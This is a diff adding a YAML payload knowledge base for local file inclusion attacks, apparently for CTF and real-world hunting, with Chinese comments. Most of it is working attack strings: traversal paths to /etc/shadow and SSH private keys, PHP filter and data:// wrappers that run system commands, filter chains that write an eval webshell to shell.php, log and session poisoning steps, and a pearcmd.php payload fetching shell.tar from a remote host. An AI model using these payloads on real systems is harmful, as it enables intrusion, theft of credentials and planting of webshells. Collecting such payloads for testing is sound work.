@@ -1,0 +1,184 @@
+# LFI (本地文件包含) Payload 知识库
+# 来源: Des-CTF-Knowledge + Hunter 实战经验
+# 更新: 2026-06-02
+
+metadata:
+  category: lfi
+  description: "LFI (本地文件包含) Payload 集合"
+  version: "1.0"
+
+# ============================================
+# 1. 基础路径遍历
+# ============================================
+basic_traversal:
+  description: "基础路径遍历"
+  linux:
+    - "../../../etc/passwd"
+    - "....//....//....//etc/passwd"
+    - "/etc/passwd"
+    - "/etc/shadow"
+    - "/etc/hosts"
+    - "/etc/hostname"
+    - "/proc/version"
+    - "/proc/self/environ"
+    - "/proc/self/cmdline"
+    - "/proc/self/fd/0"
+    - "/proc/self/fd/1"
+    - "/var/log/apache2/access.log"
+    - "/var/log/nginx/access.log"
+    - "/var/log/auth.log"
+    - "/var/log/syslog"
+    - "~/.bash_history"
+    - "~/.ssh/id_rsa"
+    - "/root/.bash_history"
+    - "/root/.ssh/id_rsa"
+  windows:
+    - "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"
+    - "c:\\windows\\system32\\drivers\\etc\\hosts"
+    - "c:\\boot.ini"
+    - "c:\\windows\\win.ini"
+    - "c:\\windows\\system.ini"
+
+# ============================================
+# 2. PHP 伪协议
+# ============================================
+php_filters:
+  description: "PHP 伪协议利用"
+  base64_read:
+    - "php://filter/read=convert.base64-encode/resource=index.php"
+    - "php://filter/convert.base64-encode/resource=config.php"
+    - "php://filter/convert.base64-encode/resource=flag.php"
+    - "php://filter/convert.base64-encode/resource=../../../etc/passwd"
+  rot13:
+    - "php://filter/string.rot13/resource=index.php"
+  string_toupper:
+    - "php://filter/string.toupper/resource=index.php"
+  string_tolower:
+    - "php://filter/string.tolower/resource=index.php"
+  strip_tags:
+    - "php://filter/string.strip_tags/resource=index.php"
+  nested_filters:
+    - "php://filter/string.rot13/resource=php://filter/convert.base64-encode/resource=flag.php"
+  input:
+    - "php://input"  # POST: <?php system('ls');?>
+  data:
+    - "data://text/plain,<?php system('ls');?>"
+    - "data://text/plain;base64,PD9waHAgc3lzdGVtKCdscycpOz8+"
+    - "data:text/plain,<?php system('ls');?>"
+    - "data:text/plain;base64,PD9waHAgc3lzdGVtKCdscycpOz8+"
+
+# ============================================
+# 3. 死亡 exit() 绕过
+# ============================================
+exit_bypass:
+  description: "file_put_contents + exit() 绕过"
+  base64_decode:
+    description: "base64解码遇到非法字符跳过，exit()中的特殊字符被忽略"
+    payloads:
+      - "php://filter/convert.base64-decode/resource=shell.php"
+  iconv:
+    payloads:
+      - "php://filter/PD9waHAgQGV2YWwoJF9QT1NUWydhJ10pOz8+|convert.iconv.utf-8.utf-7|convert.base64-decode/resource=shell.php"
+  string_strip_tags:
+    description: "PHP<7.3"
+    payloads:
+      - "php://filter/string.strip_tags/resource=?>/../shell.php"
+  zlib_chain:
+    payloads:
+      - "php://filter/zlib.deflate|string.tolower|zlib.inflate|?><?php%0dphpinfo();?>/resource=shell.php"
+
+# ============================================
+# 4. 后缀限制绕过
+# ============================================
+suffix_bypass:
+  description: "后缀限制绕过"
+  null_byte:
+    description: "PHP<5.3.4"
+    payloads:
+      - "shell.txt%00"
+  length_truncation:
+    description: "PHP<5.2.10, Linux 4096字节"
+    payloads:
+      - "././././[重复].../shell.txt"
+  zip_phar:
+    payloads:
+      - "zip://shell.zip#shell"
+      - "phar://shell.phar/shell"
+  dot_truncation:
+    description: "Windows, PHP<5.2.10"
+    payloads:
+      - "shell.txt.............................."
+
+# ============================================
+# 5. 日志包含/Session 包含
+# ============================================
+log_inclusion:
+  description: "日志文件包含"
+  steps:
+    - "1. 将 Webshell 写入 User-Agent 访问"
+    - "2. 包含日志文件"
+  log_paths:
+    - "/var/log/nginx/access.log"
+    - "/var/log/apache2/access.log"
+    - "/var/log/apache2/error.log"
+    - "/var/log/nginx/error.log"
+    - "/var/log/httpd/access_log"
+    - "/var/log/httpd/error_log"
+
+session_inclusion:
+  description: "Session 文件包含"
+  steps:
+    - "1. 注册时将用户名设为 Webshell"
+    - "2. 包含 Session 文件"
+  session_paths:
+    - "/tmp/sess_{PHPSESSID}"
+    - "/var/lib/php/sessions/sess_{PHPSESSID}"
+    - "/var/lib/php/sess_{PHPSESSID}"
+    - "/tmp/sessions/sess_{PHPSESSID}"
+
+# ============================================
+# 6. pearcmd.php 利用
+# ============================================
+pearcmd:
+  description: "pearcmd.php 文件包含利用"
+  conditions:
+    - "LFI + pearcmd 可用"
+    - "适用于 Docker 环境"
+  payload:
+    - "?file=/usr/local/lib/php/pearcmd.php&+install+-R+/tmp+http://vps/shell.tar"
+
+# ============================================
+# 7. zip:// 和 phar:// 协议
+# ============================================
+archive_protocols:
+  description: "压缩包协议利用"
+  zip:
+    - "zip://upload/shell.zip#shell.php"
+    - "zip://shell.zip%23shell.php"
+  phar:
+    - "phar://upload/shell.phar/shell.php"
+    - "phar://shell.phar/shell.php"
+  tar:
+    - "phar://shell.tar/shell.php"
+
+# ============================================
+# 8. 文件包含检测
+# ============================================
+detection:
+  description: "检测文件包含漏洞"
+  basic:
+    - "../../../etc/passwd"
+    - "....//....//....//etc/passwd"
+    - "/etc/passwd"
+    - "php://filter/convert.base64-encode/resource=index.php"
+  windows:
+    - "c:\\windows\\win.ini"
+    - "..\\..\\..\\windows\\win.ini"
+  errors:
+    - "Warning: include()"
+    - "Warning: require_once()"
+    - "Warning: include_once()"
+    - "Warning: require()"
+    - "failed to open stream"
+    - "No such file or directory"
+    - "Failed opening"
